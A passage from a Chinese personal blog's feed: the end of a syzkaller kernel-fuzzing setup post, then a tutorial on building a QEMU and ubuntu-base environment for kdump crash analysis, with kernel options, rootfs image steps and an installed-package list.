&lt;_dl_relocate_static_pie+1065&gt;    mov    rdx, qword ptr [rax + 0x10]</span><br><span class="line">   0x7ffff71cc0ad &lt;_dl_relocate_static_pie+1069&gt;    add    rax, 0x18</span><br><span class="line">   0x7ffff71cc0b1 &lt;_dl_relocate_static_pie+1073&gt;    add    rdx, r13</span><br><span class="line">   0x7ffff71cc0b4 &lt;_dl_relocate_static_pie+1076&gt;    mov    qword ptr [rcx], rdx</span><br><span class="line">────────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffde30 ◂— 0x40 /* &#x27;@&#x27; */</span><br><span class="line">01:0008│-0a8 0x7fffffffde38 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">02:0010│-0a0 0x7fffffffde40 ◂— 0xffffffffffffffff</span><br><span class="line">03:0018│-098 0x7fffffffde48 ◂— 0x100</span><br><span class="line">04:0020│-090 0x7fffffffde50 ◂— 0x800</span><br><span class="line">05:0028│-088 0x7fffffffde58 ◂— 0x1940000</span><br><span class="line">06:0030│-080 0x7fffffffde60 —▸ 0x7fffffffdeb0 ◂— 0</span><br><span class="line">07:0038│-078 0x7fffffffde68 —▸ 0x7fffffffde98 ◂— 0</span><br><span class="line">──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► 0   0x7ffff71cc090 _dl_relocate_static_pie+1040</span><br><span class="line">   1   0x7ffff7146cb6 __libc_start_main_impl+102</span><br><span class="line">   2   0x7ffff7050885 _start+37</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果还真让我搜到了：<br><a href="https://sourceware.org/bugzilla/show_bug.cgi?id=32761">https://sourceware.org/bugzilla/show_bug.cgi?id=32761</a></p><p><a href="https://www.mail-archive.com/bug-binutils@gnu.org/msg49517.html">https://www.mail-archive.com/bug-binutils@gnu.org/msg49517.html</a></p><p>glibc2.41的问题，那就用我们经典的解决方案，换到docker里挂载之后重新编译syzkaller就能解决。</p><h1>用法</h1><p>用cfg文件指定我们的目标，启动syzkaller之后用web前端观察结果。</p><p>可以fuzz驱动</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;环境配置&lt;/h1&gt;
&lt;h2 id=&quot;内核编译&quot;&gt;内核编译&lt;/h2&gt;
&lt;p&gt;内核需要开启的选项：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;</summary>
      
    
    
    
    <category term="Exploit" scheme="https://zjw1nd.github.io/categories/Exploit/"/>
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="fuzzing" scheme="https://zjw1nd.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>基于qemu和ubuntu-base的kdump分析环境</title>
    <link href="https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/"/>
    <id>https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/</id>
    <published>2025-03-21T08:45:28.000Z</published>
    <updated>2025-06-01T07:37:43.278Z</updated>
    
    <content type="html"><![CDATA[<p>OS比赛的环境搭建折磨了我两天，因此有必要在这里记录下全过程，以后自己想用什么系统也会方便一点。而且网上的blog对于坑是只字不提啊我日。</p><p>目前能够完美运行kdump的环境，基于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QEMU emulator version 9.2.2</span><br><span class="line">Kernel: 6.13.7-arch1-1</span><br><span class="line">虚拟机主内核: linux-6.13.7(compiled from src)</span><br><span class="line">虚拟机副内核: linux-5.4.10</span><br><span class="line">根文件系统: UbuntuBase20.04</span><br></pre></td></tr></table></figure><h1>1. Kernel</h1><h2 id="主内核，即启动加载的内核">主内核，即启动加载的内核</h2><p>要想运行qemu-system, 首先当然需要一个自定义的内核。对于需要调试的内核，我们待会要用到核心转储文件和带有调试信息的无压缩内核，因此，从官网下载源码后，要打开这些编译选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KEXEC=y</span><br><span class="line">CONFIG_SYSFS=y</span><br><span class="line"></span><br><span class="line">CONFIG_CRASH_DUMP=y</span><br><span class="line">CONFIG_PROC_VMCORE=y</span><br><span class="line">CONFIG_RELOCATABLE=y</span><br><span class="line"></span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_DEBUG_INFO_REDUCED=n</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF4=y</span><br><span class="line">CONFIG_DEBUG_FS=y # idk这个随便开的</span><br></pre></td></tr></table></figure><p>这些选项是从各种网站博客之类收集来的，我使用的build脚本是在<a href="https://github.com/pwncollege/pwnkernel">pwncollege提供的脚本</a>基础上做的修改，我也同样建议你在各种地方使用这个脚本来构建和启动内核。最终的build脚本<a href="/files/build.sh">在这里</a>。</p><h2 id="需要注意的是…">需要注意的是…</h2><p>首先，crash工具的本质是一个gdb的套壳。我的arch pacman安装的最新crash里面的gdb版本也才到7.4，所以它不支持dwarf5格式的调试信息，需要<strong>改成dwarf4</strong>，否则会报错。</p><p>其次，对于宿主机来说，如果你想编译一个比较低版本的内核，需要注意自己的gcc版本。我开始在试图编译一个ubuntu20.04的5.4.1内核的时候，会一直报错说UAF的检查不过。这种情况，你有两种选择，一是<strong>用docker（也可以试试包管理器但是有点搞）安装一个低版本的gcc环境</strong>，推荐gcc8。docker pull就可以。这之后在docker里面去编译内核。（我忘记是-v映射还是docker内clone的源码了）</p><p>二是抛弃低版本的内核，使用高版本内核，使用和你的宿主机一致的内核版本最好。当然，可能会有的问题我们后面再说。</p><h1>2. 文件镜像</h1><blockquote><p>参考 <a href="https://www.cnblogs.com/wsg1100/p/13127636.html#23">https://www.cnblogs.com/wsg1100/p/13127636.html#23</a></p></blockquote><p>由于kdump相关的工具链在ubuntu的仓库中很全而且可以apt一键安装，因此我建议基于ubuntu-base去构建rootfs。</p><p>这里我用的是ubuntu20.04的ubuntu-base。首先从<a href="https://cdimage.ubuntu.com/ubuntu-base/releases/focal/release/">官网</a>或者镜像站下载ubuntu-base的tar包，接着首先创建一个空的镜像，我使用的是qemu-img：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f raw rootfs.img 4G</span><br></pre></td></tr></table></figure><p>当然也可以用dd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这是10G!</span><br><span class="line">dd if=/dev/zero of=ubuntu_base.img bs=1G count=10</span><br></pre></td></tr></table></figure><p>写好后用mkfs.ext4对它进行初始化。</p><p><font color=red><b>⚠️注意！mkfs工具和内核的版本是相关的。对于新的内核其能够支持更新的ext4特性，但是这样创建的镜像会导致低版本的内核无法挂载rootfs，只能在initramfs里。这一问题我排查了很长时间才发现。如果你的宿主机内核比较新，为了避免相关情况，可以使用低版本ubuntu的docker内提供的mkfs</b></font><br>可以尝试使用<code>tune2fs -l your.img | grep Features</code>来查看相关的特性。如果你在切换内核时无法进入根文件系统并且日志中提到ext4的问题，试着用低版本的mkfs重新创建镜像。</p><blockquote><p>对于报错不支持特性的代码，可以在<a href="https://web.git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/tree/lib/ext2fs/ext2_fs.h#n810">这里</a>查看。按理说，tune2fs -O 参数可以用^feature关闭特性，但是我自己尝试的时候并不能生效。</p></blockquote><p>然后，mount上这个文件（我的系统不需要额外参数，直接sudo mount img dir就可以），将ubuntubase解压进文件夹。</p><p>接着，如果你是ubuntu系统，就可以将你自己的镜像源，dns等拷进去。但是从0开始总是好的。</p><h2 id="相关的配置">相关的配置</h2><p>apt source位于<code>/etc/apt/sources.list</code>. 在你的宿主机上改掉它，换源就不赘述了。接着是dns，这个文件则是<code>/etc/resolv.conf</code>，可以拷贝你主机的文件过去，也可以直接写入<code>nameserver 8.8.8.8</code>或114。</p><p>然后chroot进去用apt开始装东西，虚拟文件系统包括/dev, /proc这些可以不挂载，用处不大。apt warning不用管，都是日志没位置输出之类的。目前，我们的base里没有公钥，所以换源后执行update如果说没有gpg什么的，这样跑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get udpate --allow-insecure-repositories</span><br></pre></td></tr></table></figure><p>然后直接aptinstall相应的东西，提示无认证的时候选y不要默认N直接装就行了。</p><p><strong>下面apt要装的东西很重要</strong>，少了的话后面会很痛苦。</p><p>首先配置这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install locales language-pack-en-base</span><br><span class="line">echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf</span><br><span class="line">echo &quot;test&quot; &gt; /etc/hostname</span><br><span class="line">apt-get install bash-completion</span><br></pre></td></tr></table></figure><p><code>/etc/hosts</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.0.1 test</span><br><span class="line">127.0.1.1 test.localdomain test</span><br></pre></td></tr></table></figure><p>然后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install init vim -y</span><br></pre></td></tr></table></figure><p><font color=yellow>一定要安装init包！一定要安装init包！一定要安装init包！</font>不然你的电脑会没有reboot和shutdown命令，只能qemu关闭，kdump无法自动触发重启。</p><p>在这里可选安装/boot下的内核和initrd，如果你有自己的第二内核可以自己copy进去提供给kexec，我是使用的现成的内核和initrd。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-image-kvm</span><br><span class="line"># （不一定是这个，可以搜索安装当前base版本或更低版本的内核和header）</span><br></pre></td></tr></table></figure><p>最后安装kdump，可以参考<a href="https://documentation.ubuntu.com/server/how-to/software/kernel-crash-dump/index.html">更详细的doc</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-crashdump kexec-tools crash</span><br><span class="line"># linux-crashdump: 全套，按理说装这一个就可以，包含kdump-tools，kexec-tools</span><br><span class="line"># crash: 分析工具，我建议宿主机装</span><br></pre></td></tr></table></figure><p>安装过程中会问配置，自己选即可。</p><p>这是我的base系统最终<code>apt list --installed</code>的结果，供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line">adduser/focal,now 3.118ubuntu2 all [installed]</span><br><span class="line">alsa-topology-conf/focal,now 1.2.2-1 all [installed,automatic]</span><br><span class="line">alsa-ucm-conf/focal-updates,now 1.2.2-1ubuntu0.13 all [installed,automatic]</span><br><span class="line">apport-symptoms/focal,now 0.23 all [installed,automatic]</span><br><span class="line">apport/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">apt/focal-updates,now 2.0.10 amd64 [installed]</span><br><span class="line">base-files/focal-updates,now 11ubuntu5.8 amd64 [installed]</span><br><span class="line">base-passwd/focal,now 3.5.47 amd64 [installed]</span><br><span class="line">bash-completion/focal,now 1:2.10-1ubuntu1 all [installed]</span><br><span class="line">bash/focal-updates,focal-security,now 5.0-6ubuntu1.2 amd64 [installed]</span><br><span class="line">binutils-common/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">binutils-x86-64-linux-gnu/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">binutils/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">bsdmainutils/focal,now 11.1.2ubuntu3 amd64 [installed,automatic]</span><br><span class="line">bsdutils/focal-updates,focal-security,now 1:2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">busybox-initramfs/focal-updates,focal-security,now 1:1.30.1-4ubuntu6.5 amd64 [installed,automatic]</span><br><span class="line">bzip2/focal,now 1.0.8-2 amd64 [installed]</span><br><span class="line">ca-certificates/focal-updates,focal-security,now 20240203~20.04.1 all [installed,automatic]</span><br><span class="line">coreutils/focal,now 8.30-3ubuntu2 amd64 [installed]</span><br><span class="line">cpio/focal-updates,focal-security,now 2.13+dfsg-2ubuntu0.4 amd64 [installed,automatic]</span><br><span class="line">crash/focal-updates,now 7.2.8-1ubuntu1.20.04.1 amd64 [installed,automatic]</span><br><span class="line">dash/focal,now 0.5.10.2-6 amd64 [installed]</span><br><span class="line">dbus/focal-updates,focal-security,now 1.12.16-2ubuntu2.3 amd64 [installed,automatic]</span><br><span class="line">debconf/focal,now 1.5.73 all [installed]</span><br><span class="line">debianutils/focal,now 4.9.1 amd64 [installed]</span><br><span class="line">diffutils/focal,now 1:3.7-3 amd64 [installed]</span><br><span class="line">distro-info-data/focal-updates,now 0.43ubuntu1.17 all [installed,automatic]</span><br><span class="line">dmsetup/focal,now 2:1.02.167-1ubuntu1 amd64 [installed,automatic]</span><br><span class="line">dpkg/focal-updates,focal-security,now 1.19.7ubuntu3.2 amd64 [installed]</span><br><span class="line">e2fsprogs/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">fdisk/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">file/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">findutils/focal,now 4.7.0-1ubuntu1 amd64 [installed]</span><br><span class="line">gcc-10-base/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">gettext-base/focal,now 0.19.8.1-10build1 amd64 [installed,automatic]</span><br><span class="line">gir1.2-glib-2.0/focal-updates,now 1.64.1-1~ubuntu20.04.1 amd64 [installed,automatic]</span><br><span class="line">gpgv/focal-updates,focal-security,now 2.2.19-3ubuntu2.2 amd64 [installed]</span><br><span class="line">grep/focal,now 3.4-1 amd64 [installed]</span><br><span class="line">grub-common/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub-gfxpayload-lists/focal,now 0.7 amd64 [installed,automatic]</span><br><span class="line">grub-pc-bin/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub-pc/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub2-common/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">gzip/focal-updates,focal-security,now 1.10-0ubuntu4.1 amd64 [installed]</span><br><span class="line">hostname/focal,now 3.23 amd64 [installed]</span><br><span class="line">init-system-helpers/focal,now 1.57 all [installed]</span><br><span class="line">init/focal,now 1.57 amd64 [installed]</span><br><span class="line">initramfs-tools-bin/focal-updates,now 0.136ubuntu6.7 amd64 [installed,automatic]</span><br><span class="line">initramfs-tools-core/focal-updates,now 0.136ubuntu6.7 all [installed,automatic]</span><br><span class="line">initramfs-tools/focal-updates,now 0.136ubuntu6.7 all [installed,automatic]</span><br><span class="line">iputils-ping/focal-updates,now 3:20190709-3ubuntu1 amd64 [installed]</span><br><span class="line">iso-codes/focal,now 4.4-1 all [installed,automatic]</span><br><span class="line">kdump-tools/focal-updates,now 1:1.6.7-1ubuntu2.5 amd64 [installed]</span><br><span class="line">kexec-tools/focal-updates,now 1:2.0.18-1ubuntu1.1 amd64 [installed]</span><br><span class="line">klibc-utils/focal-updates,focal-security,now 2.0.7-1ubuntu5.2 amd64 [installed,automatic]</span><br><span class="line">kmod/focal-updates,now 27-1ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libacl1/focal,now 2.2.53-6 amd64 [installed]</span><br><span class="line">libapparmor1/focal-updates,focal-security,now 2.13.3-7ubuntu5.4 amd64 [installed,automatic]</span><br><span class="line">libapt-pkg6.0/focal-updates,now 2.0.10 amd64 [installed]</span><br><span class="line">libargon2-1/focal,now 0~20171227-0.2 amd64 [installed,automatic]</span><br><span class="line">libasound2-data/focal-updates,now 1.2.2-2.1ubuntu2.5 all [installed,automatic]</span><br><span class="line">libasound2/focal-updates,now 1.2.2-2.1ubuntu2.5 amd64 [installed,automatic]</span><br><span class="line">libattr1/focal,now 1:2.4.48-5 amd64 [installed]</span><br><span class="line">libaudit-common/focal,now 1:2.8.5-2ubuntu6 all [installed]</span><br><span class="line">libaudit1/focal,now 1:2.8.5-2ubuntu6 amd64 [installed]</span><br><span class="line">libbinutils/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libblkid1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libbsd0/focal,now 0.10.0-1 amd64 [installed,automatic]</span><br><span class="line">libbz2-1.0/focal,now 1.0.8-2 amd64 [installed]</span><br><span class="line">libc-bin/focal-updates,focal-security,now 2.31-0ubuntu9.17 amd64 [installed]</span><br><span class="line">libc6/focal-updates,focal-security,now 2.31-0ubuntu9.17 amd64 [installed]</span><br><span class="line">libcanberra0/focal,now 0.30-7ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libcap-ng0/focal,now 0.7.9-2.1build1 amd64 [installed]</span><br><span class="line">libcap2-bin/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libcap2/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libcom-err2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libcrypt1/focal,now 1:4.4.10-10ubuntu4 amd64 [installed]</span><br><span class="line">libcryptsetup12/focal-updates,focal-security,now 2:2.2.2-3ubuntu2.4 amd64 [installed,automatic]</span><br><span class="line">libctf-nobfd0/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libctf0/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libdb5.3/focal,now 5.3.28+dfsg1-0.6ubuntu2 amd64 [installed]</span><br><span class="line">libdbus-1-3/focal-updates,focal-security,now 1.12.16-2ubuntu2.3 amd64 [installed,automatic]</span><br><span class="line">libdebconfclient0/focal,now 0.251ubuntu1 amd64 [installed]</span><br><span class="line">libdevmapper1.02.1/focal,now 2:1.02.167-1ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libdw1/focal-updates,focal-security,now 0.176-1.1ubuntu0.1 amd64 [installed,automatic]</span><br><span class="line">libefiboot1/focal-updates,now 37-2ubuntu2.2 amd64 [installed,automatic]</span><br><span class="line">libefivar1/focal-updates,now 37-2ubuntu2.2 amd64 [installed,automatic]</span><br><span class="line">libelf1/focal-updates,focal-security,now 0.176-1.1ubuntu0.1 amd64 [installed,automatic]</span><br><span class="line">libexpat1/focal-updates,focal-security,now 2.2.9-1ubuntu0.8 amd64 [installed,automatic]</span><br><span class="line">libext2fs2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libfdisk1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libffi7/focal,now 3.3-4 amd64 [installed]</span><br><span class="line">libfreetype6/focal-updates,focal-security,now 2.10.1-2ubuntu0.4 amd64 [installed,automatic]</span><br><span class="line">libfuse2/focal,now 2.9.9-3 amd64 [installed,automatic]</span><br><span class="line">libgcc-s1/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">libgcrypt20/focal-updates,focal-security,now 1.8.5-5ubuntu1.1 amd64 [installed]</span><br><span class="line">libgdbm-compat4/focal,now 1.18.1-5 amd64 [installed,automatic]</span><br><span class="line">libgdbm6/focal,now 1.18.1-5 amd64 [installed,automatic]</span><br><span class="line">libgirepository-1.0-1/focal-updates,now 1.64.1-1~ubuntu20.04.1 amd64 [installed,automatic]</span><br><span class="line">libglib2.0-0/focal-updates,focal-security,now 2.64.6-1~ubuntu20.04.8 amd64 [installed,automatic]</span><br><span class="line">libglib2.0-data/focal-updates,focal-security,now 2.64.6-1~ubuntu20.04.8 all [installed,automatic]</span><br><span class="line">libgmp10/focal-updates,focal-security,now 2:6.2.0+dfsg-4ubuntu0.1 amd64 [installed]</span><br><span class="line">libgnutls30/focal-updates,focal-security,now 3.6.13-2ubuntu1.12 amd64 [installed]</span><br><span class="line">libgpg-error0/focal,now 1.37-1 amd64 [installed]</span><br><span class="line">libgpm2/focal,now 1.20.7-5 amd64 [installed,automatic]</span><br><span class="line">libhogweed5/focal-updates,focal-security,now 3.5.1+really3.5.1-2ubuntu0.2 amd64 [installed]</span><br><span class="line">libicu66/focal-updates,focal-security,now 66.1-2ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libidn2-0/focal,now 2.2.0-2 amd64 [installed]</span><br><span class="line">libip4tc2/focal-updates,now 1.8.4-3ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libjson-c4/focal-updates,focal-security,now 0.13.1+dfsg-7ubuntu0.3 amd64 [installed,automatic]</span><br><span class="line">libklibc/focal-updates,focal-security,now 2.0.7-1ubuntu5.2 amd64 [installed,automatic]</span><br><span class="line">libkmod2/focal-updates,now 27-1ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libltdl7/focal,now 2.4.6-14 amd64 [installed,automatic]</span><br><span class="line">liblz4-1/focal-updates,focal-security,now 1.9.2-2ubuntu0.20.04.1 amd64 [installed]</span><br><span class="line">liblzma5/focal-updates,focal-security,now 5.2.4-1ubuntu1.1 amd64 [installed]</span><br><span class="line">liblzo2-2/focal,now 2.10-2 amd64 [installed,automatic]</span><br><span class="line">libmagic-mgc/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">libmagic1/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">libmount1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libmpdec2/focal,now 2.4.2-3 amd64 [installed,automatic]</span><br><span class="line">libncurses6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libncursesw6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libnettle7/focal-updates,focal-security,now 3.5.1+really3.5.1-2ubuntu0.2 amd64 [installed]</span><br><span class="line">libnss-systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">libogg0/focal,now 1.3.4-0ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libp11-kit0/focal-updates,focal-security,now 0.23.20-1ubuntu0.1 amd64 [installed]</span><br><span class="line">libpam-cap/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libpam-modules-bin/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpam-modules/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpam-runtime/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 all [installed]</span><br><span class="line">libpam-systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">libpam0g/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpcre2-8-0/focal-updates,focal-security,now 10.34-7ubuntu0.1 amd64 [installed]</span><br><span 